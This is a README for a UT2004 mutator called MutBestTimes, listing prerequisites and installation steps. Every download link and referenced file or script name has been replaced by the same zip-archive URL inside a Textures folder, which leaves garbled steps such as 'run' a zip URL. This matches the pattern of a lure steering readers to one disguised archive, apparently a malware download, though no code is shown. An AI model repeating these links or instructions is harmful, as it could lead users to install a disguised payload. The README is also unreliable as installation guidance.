# MutBestTimes

# Pre-Requisites
The following packages are necessary to run BTimes:
* TrialGroup.u (https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip) (https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip)
* TextureBTimes (optional, store skins) (Currently not available for download)
* MakeCommandletUtils.u (Required to compile the project. Download: https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip (save as))

# Installing
To install you have to clone two branches, Client-develop and Server-develop.
Install those to your UT2004's folder, install the pre-requisites (TrialGroup.u, TextureBTimes.u (optional)), and run the https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip found in /ClientBTimes/, and if successfull, run https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip in /ServerBTimes/.

Or you can install the pre-built build at https://github.com/LPmitCrush/MutBestTimes/raw/refs/heads/master/ClientBTimes/Textures/Mut-Best-Times-v3.0.zip
